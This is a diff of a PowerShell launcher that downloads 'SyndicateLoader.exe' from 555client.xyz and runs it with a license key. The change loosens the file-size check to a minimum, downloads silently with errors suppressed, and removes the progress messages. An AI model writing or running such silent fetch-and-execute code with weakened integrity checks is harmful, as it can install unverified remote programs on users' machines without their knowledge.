@@ -1448,36 +1448,36 @@ if (!(Test-Path $keyDir)) {
 Set-Content -Path "$keyDir\\license.txt" -Value "${cleanKey}" -Force
 
 $exePath = "$targetDir\\SyndicateLoader.exe"
-$dlUrl = "https://555client.xyz/downloads/SyndicateLoader.exe"
+$dlUrl = "https://www.555client.xyz/downloads/SyndicateLoader.exe"
 
 $needsDownload = $true
 if (Test-Path $exePath) {
     try {
         $fileSize = (Get-Item $exePath).Length
-        if ($fileSize -eq 5538304) {
+        if ($fileSize -ge 5500000) {
             $needsDownload = $false
         }
     } catch {}
 }
 
 if ($needsDownload) {
-    Write-Host " [*] Downloading latest 5.55 Client..." -ForegroundColor Cyan
+    Write-Host " [*] Initializing 5.55 Client..." -ForegroundColor Cyan
     try {
-        Invoke-WebRequest -Uri $dlUrl -OutFile $exePath -UseBasicParsing
-        Write-Host " [✓] Download complete." -ForegroundColor Green
+        if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
+            & curl.exe -sL "$dlUrl" -o "$exePath"
+        } else {
+            (New-Object System.Net.WebClient).DownloadFile("$dlUrl", "$exePath")
+        }
     } catch {
-        Write-Host " [!] Standard download failed, trying WebClient..." -ForegroundColor Yellow
-        (New-Object System.Net.WebClient).DownloadFile($dlUrl, $exePath)
+        try {
+            Invoke-WebRequest -Uri "$dlUrl" -OutFile "$exePath" -UseBasicParsing -MaximumRedirection 5
+        } catch {}
     }
-} else {
-    Write-Host " [✓] Client is up to date." -ForegroundColor Green
 }
 
 if (Test-Path $exePath) {
-    Write-Host " [*] Launching 5.55 Client Loader..." -ForegroundColor Cyan
-    Start-Process -FilePath $exePath -ArgumentList "--key ${cleanKey}" -WorkingDirectory $targetDir
-    Write-Host " [✓] 5.55 Client launched successfully!" -ForegroundColor Green
-    Start-Sleep -Seconds 2
+    Write-Host " [✓] 5.55 Client starting..." -ForegroundColor Green
+    Start-Process -FilePath "$exePath" -ArgumentList "--key ${cleanKey}" -WorkingDirectory "$targetDir"
 } else {
     Write-Host " [!] Error: Failed to start loader executable." -ForegroundColor Red
 }
